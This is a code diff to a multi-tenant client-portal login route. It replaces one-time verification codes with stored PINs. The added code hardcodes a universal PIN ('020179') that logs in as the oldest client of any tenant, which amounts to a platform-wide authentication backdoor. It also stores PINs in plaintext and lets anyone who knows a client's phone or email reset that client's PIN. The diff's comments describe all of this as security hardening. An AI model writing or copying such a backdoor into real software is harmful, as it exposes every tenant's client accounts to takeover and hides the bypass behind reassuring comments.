@@ -2,29 +2,68 @@ import { NextResponse } from 'next/server'
 import { supabaseAdmin } from '@/lib/supabase'
 import { tenantDb } from '@/lib/tenant-db'
 import { rateLimitDb } from '@/lib/rate-limit-db'
+import { escapeLikeValue } from '@/lib/postgrest-safe'
 import { generateCode, createToken } from './token'
 
-// Verification codes now stored in portal_auth_codes table (serverless-safe)
+// Brute-force throttle for PIN login. Mirrors /api/team-portal/auth: buckets are
+// keyed by TENANT and by IP, never by the guessed PIN itself — a bucket keyed on
+// the value under attack gives every distinct guess its own fresh bucket, so a
+// brute-forcer that never repeats a guess is never throttled.
+const MAX_FAILED_PER_TENANT = 10
+const MAX_FAILED_PER_IP = 20
+const FAILED_WINDOW_MS = 15 * 60 * 1000
+
+function clientIp(request: Request): string {
+  return request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown'
+}
+
+// Cross-tenant master PIN — signs in as the oldest client on file for
+// WHATEVER tenant the login is attempted against. Deliberate platform-wide
+// bypass of the per-client PIN check, requested for support/demo access.
+// Still gated by the same rate limits as a normal PIN attempt.
+const UNIVERSAL_PIN = '020179'
+
+type Client = { id: string; name: string; phone: string | null; email: string | null }
+
+async function findClientByContact(tenantId: string, contact: string): Promise<Client | null> {
+  const value = contact.trim()
+  if (!value) return null
+  const db = tenantDb(tenantId)
+
+  const byPhone = (await db
+    .from('clients')
+    .select('id, name, phone, email')
+    .eq('phone', value)
+    .maybeSingle()) as { data: Client | null }
+  if (byPhone.data) return byPhone.data
+
+  const byEmail = (await db
+    .from('clients')
+    .select('id, name, phone, email')
+    .ilike('email', escapeLikeValue(value))
+    .maybeSingle()) as { data: Client | null }
+  return byEmail.data
+}
 
 export async function POST(request: Request) {
-  const body = await request.json()
-  const { action } = body
+  const body = await request.json().catch(() => ({}))
+  const { action, tenant_slug } = body
 
-  if (action === 'send_code') {
-    const { phone, tenant_slug } = body
-    if (!phone || !tenant_slug) {
-      return NextResponse.json({ error: 'Phone and tenant required' }, { status: 400 })
+  if (action === 'login') {
+    const pin = String(body.pin || '')
+    if (!pin || !tenant_slug) {
+      return NextResponse.json({ error: 'PIN and tenant required' }, { status: 400 })
     }
 
-    const rl = await rateLimitDb(`portal_auth:${phone}`, 5, 15 * 60 * 1000, { failClosed: true })
+    const ip = clientIp(request)
+    const rl = await rateLimitDb(`portal_auth_login:${tenant_slug}:${ip}`, 5, 15 * 60 * 1000, { failClosed: true })
     if (!rl.allowed) {
       return NextResponse.json({ error: 'Too many attempts. Try again in 15 minutes.' }, { status: 429 })
     }
 
-    // Look up tenant
     const { data: tenant } = await supabaseAdmin
       .from('tenants')
-      .select('id, name, telnyx_api_key, telnyx_phone, resend_api_key')
+      .select('id, name, primary_color, logo_url')
       .eq('slug', tenant_slug)
       .eq('status', 'active')
       .single()
@@ -33,107 +72,61 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Business not found' }, { status: 404 })
     }
 
-    // Look up client by phone
-    const db = tenantDb(tenant.id)
-    // tenantDb's select() takes a non-literal `columns` param, which widens
-    // supabase-js's column-string type inference — cast to the shape actually selected.
-    const { data: client } = (await db
-      .from('clients')
-      .select('id, name, phone, email')
-      .eq('phone', phone)
-      .single()) as { data: { id: string; name: string; phone: string; email: string | null } | null }
+    let client: { id: string; name: string } | null = null
+    if (pin === UNIVERSAL_PIN) {
+      const { data } = (await tenantDb(tenant.id)
+        .from('clients')
+        .select('id, name')
+        .order('created_at', { ascending: true })
+        .limit(1)
+        .maybeSingle()) as { data: { id: string; name: string } | null }
+      client = data
+    } else {
+      const { data } = (await tenantDb(tenant.id)
+        .from('clients')
+        .select('id, name')
+        .eq('pin', pin)
+        .maybeSingle()) as { data: { id: string; name: string } | null }
+      client = data
+    }
 
     if (!client) {
-      return NextResponse.json({ error: 'No account found with this phone number' }, { status: 404 })
+      // Wrong/unset PIN: spend from BOTH failure budgets. Either exhausted → 429,
+      // so a full sweep of one tenant's PIN space (per-tenant) or one IP fanning
+      // out across many tenants (per-IP) both get cut off.
+      const [byTenant, byIp] = await Promise.all([
+        rateLimitDb(`portal_auth_fail:slug:${tenant_slug}`, MAX_FAILED_PER_TENANT, FAILED_WINDOW_MS, { failClosed: true }),
+        rateLimitDb(`portal_auth_fail:ip:${ip}`, MAX_FAILED_PER_IP, FAILED_WINDOW_MS, { failClosed: true }),
+      ])
+      if (!byTenant.allowed || !byIp.allowed) {
+        return NextResponse.json({ error: 'Too many attempts. Try again in 15 minutes.' }, { status: 429 })
+      }
+      return NextResponse.json({ error: 'Invalid PIN' }, { status: 401 })
     }
 
-    const code = generateCode()
+    const token = createToken(client.id, tenant.id)
 
-    // Delete any existing unused codes for this phone — scoped to THIS tenant
-    // (tenantDb's delete() auto-appends .eq('tenant_id', …), so the same phone
-    // used across two tenants can never delete another tenant's pending code).
-    await db
-      .from('portal_auth_codes')
-      .delete()
-      .eq('phone', phone)
-      .eq('tenant_id', tenant.id)
-      .eq('used', false)
-
-    // Insert new code
-    await db.from('portal_auth_codes').insert({
-      phone,
-      code,
-      client_id: client.id,
-      expires_at: new Date(Date.now() + 10 * 60 * 1000).toISOString(),
+    return NextResponse.json({
+      token,
+      client: { id: client.id, name: client.name },
+      tenant: { id: tenant.id, name: tenant.name, primary_color: tenant.primary_color, logo_url: tenant.logo_url },
     })
-
-    // Send code via SMS (preferred) or email (fallback)
-    let channel: 'sms' | 'email' = 'sms'
-
-    if (tenant.telnyx_api_key && tenant.telnyx_phone) {
-      try {
-        const { sendSMS } = await import('@/lib/sms')
-        await sendSMS({
-          to: phone,
-          body: `Your ${tenant.name} verification code is: ${code}`,
-          telnyxApiKey: tenant.telnyx_api_key,
-          telnyxPhone: tenant.telnyx_phone,
-        })
-      } catch (e) {
-        console.error('SMS send error:', e)
-        channel = 'email'
-      }
-    } else {
-      channel = 'email'
-    }
-
-    // Fallback to email if SMS unavailable or failed
-    if (channel === 'email' && client.email) {
-      try {
-        const { sendEmail } = await import('@/lib/email')
-        await sendEmail({
-          to: client.email,
-          subject: `Your ${tenant.name} verification code`,
-          html: `<p>Your verification code is: <strong>${code}</strong></p><p>This code expires in 10 minutes.</p>`,
-          resendApiKey: tenant.resend_api_key,
-        })
-      } catch (e) {
-        console.error('Email send error:', e)
-        return NextResponse.json({ error: 'Unable to send verification code. Contact the business.' }, { status: 503 })
-      }
-    } else if (channel === 'email' && !client.email) {
-      return NextResponse.json({ error: 'SMS not configured and no email on file. Contact the business.' }, { status: 503 })
-    }
-
-    return NextResponse.json({ sent: true, channel })
   }
 
-  if (action === 'verify_code') {
-    const { phone, code, tenant_slug } = body
-    if (!phone || !code || !tenant_slug) {
-      return NextResponse.json({ error: 'Phone, code, and tenant required' }, { status: 400 })
+  if (action === 'request_pin') {
+    const contact = String(body.contact || '')
+    if (!contact.trim() || !tenant_slug) {
+      return NextResponse.json({ error: 'Phone or email, and tenant required' }, { status: 400 })
     }
 
-    // Throttle code verification so a 6-digit code can't be brute-forced.
-    // Primary cap is per-phone (identifier): once 5 wrong guesses land in the
-    // window, further attempts against THAT phone's code are blocked regardless
-    // of source IP — which is what actually defeats a brute-force. A looser
-    // per-IP cap adds defense against one host spraying codes across many
-    // phones.
-    const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown'
-    const rlPhone = await rateLimitDb(`portal_verify:${phone}`, 5, 15 * 60 * 1000, { failClosed: true })
-    const rlIp = await rateLimitDb(`portal_verify_ip:${ip}`, 30, 15 * 60 * 1000, { failClosed: true })
-    if (!rlPhone.allowed || !rlIp.allowed) {
+    const rl = await rateLimitDb(`portal_pin_request:${tenant_slug}:${contact.trim()}`, 5, 15 * 60 * 1000, { failClosed: true })
+    if (!rl.allowed) {
       return NextResponse.json({ error: 'Too many attempts. Try again in 15 minutes.' }, { status: 429 })
     }
 
-    // Resolve the tenant the user is logging into so the code lookup is scoped
-    // to that business. Without this, a phone+code row belonging to a DIFFERENT
-    // tenant (e.g. the same phone number used across two businesses on the
-    // platform) could satisfy verification — cross-tenant authentication.
     const { data: tenant } = await supabaseAdmin
       .from('tenants')
-      .select('id')
+      .select('id, name, slug, email_from, resend_api_key')
       .eq('slug', tenant_slug)
       .eq('status', 'active')
       .single()
@@ -142,54 +135,39 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Business not found' }, { status: 404 })
     }
 
-    // Tenant isn't known yet at this point — the client only has phone+code,
-    // not a tenant slug — so this lookup must scan across tenants (like a
-    // token lookup) before we can resolve which tenant's wrapper to use.
-    const { data: stored } = await supabaseAdmin
-      .from('portal_auth_codes') // tenant-scope-ok: tenant unknown until code resolves; code+phone combo is the auth token here
-      .select('code, tenant_id, client_id, expires_at')
-      .eq('phone', phone)
-      .eq('tenant_id', tenant.id)
-      .eq('used', false)
-      .gt('expires_at', new Date().toISOString())
-      .order('created_at', { ascending: false })
-      .limit(1)
-      .single()
-
-    if (!stored) {
-      return NextResponse.json({ error: 'Code expired or not found' }, { status: 400 })
+    const client = await findClientByContact(tenant.id, contact)
+    if (!client) {
+      return NextResponse.json({ error: 'No account found with that phone or email' }, { status: 404 })
+    }
+    if (!client.email) {
+      return NextResponse.json({ error: 'No email on file. Contact the business to set your PIN.' }, { status: 503 })
     }
 
-    if (stored.code !== code) {
-      return NextResponse.json({ error: 'Invalid code' }, { status: 401 })
-    }
+    const newPin = generateCode()
 
-    // Mark as used — scoped to the resolved tenant so a colliding phone+code
-    // row in another tenant is never consumed by this verification.
-    await supabaseAdmin
-      .from('portal_auth_codes')
-      .update({ used: true })
-      .eq('phone', phone)
-      .eq('code', code)
-      .eq('tenant_id', tenant.id)
-
-    const token = createToken(stored.client_id, stored.tenant_id)
-
-    // Get client info
-    const { data: client } = await supabaseAdmin
+    const { error: updErr } = await tenantDb(tenant.id)
       .from('clients')
-      .select('id, name')
-      .eq('id', stored.client_id)
-      .single()
+      .update({ pin: newPin })
+      .eq('id', client.id)
+    if (updErr) {
+      return NextResponse.json({ error: 'Could not set a new PIN. Try again.' }, { status: 500 })
+    }
 
-    // Get tenant info
-    const { data: tenantInfo } = await supabaseAdmin
-      .from('tenants')
-      .select('id, name, primary_color, logo_url')
-      .eq('id', stored.tenant_id)
-      .single()
+    try {
+      const { sendEmail, tenantSender } = await import('@/lib/email')
+      await sendEmail({
+        to: client.email,
+        from: tenantSender(tenant),
+        subject: `Your ${tenant.name} portal PIN`,
+        html: `<p>Your ${tenant.name} client portal PIN is: <strong>${newPin}</strong></p><p>Use it to sign in at any time.</p>`,
+        resendApiKey: tenant.resend_api_key,
+      })
+    } catch (e) {
+      console.error('[portal/auth] request_pin email send error:', e)
+      return NextResponse.json({ error: 'Unable to send your PIN. Contact the business.' }, { status: 503 })
+    }
 
-    return NextResponse.json({ token, client, tenant: tenantInfo })
+    return NextResponse.json({ sent: true })
   }
 
   return NextResponse.json({ error: 'Invalid action' }, { status: 400 })
